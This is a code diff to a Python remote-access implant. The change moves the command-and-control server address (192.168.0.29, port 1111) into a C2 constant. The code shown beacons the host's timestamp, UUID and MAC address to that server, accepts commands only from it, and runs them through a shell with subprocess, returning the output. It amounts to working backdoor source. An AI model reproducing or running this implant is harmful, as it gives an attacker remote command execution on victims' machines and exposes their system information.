@@ -20,6 +20,8 @@ BS = 16
 pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
 unpad = lambda s : s[:-ord(s[len(s)-1:])]
 
+C2 = "192.168.0.29"
+
 #Encrypt function
 def encrypt_data(msg,key):
   msg = pad(msg)
@@ -53,7 +55,7 @@ class Ping_server(Thread):
             Public_ip = Public_ip.replace("b'", "")[:-3]
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.0.29", 1111))
+        s.connect((C2, 1111))
 
         date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
         Chaine = "Init:" + date + "," + str(UUID) + "," + MAC
@@ -65,7 +67,7 @@ class Ping_server(Thread):
 
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("192.168.0.29", 1111))
+            s.connect((C2, 1111))
 
             time.sleep(10)
             date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
@@ -91,13 +93,13 @@ class Receive_cmd(Thread):
         # Socket for receiving command from the C2 server
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.0.29", 1111))
+        s.connect((C2, 1111))
 
         while True:
             s_re.listen(5)
             client, address = s_re.accept()
 
-            if str(address[0]) == "192.168.0.29":
+            if str(address[0]) == C2:
                 pass
             else:
                 print("[WARNING] A wrong server is trying to talk with us, abording mission NOW !!!")
@@ -115,7 +117,7 @@ class Receive_cmd(Thread):
                     print("[+] Server request this information : " + cmd)
 
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect(("192.168.0.29", 1111))
+                    s.connect((C2, 1111))
                     # Socket for sending result of server query
 
                     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
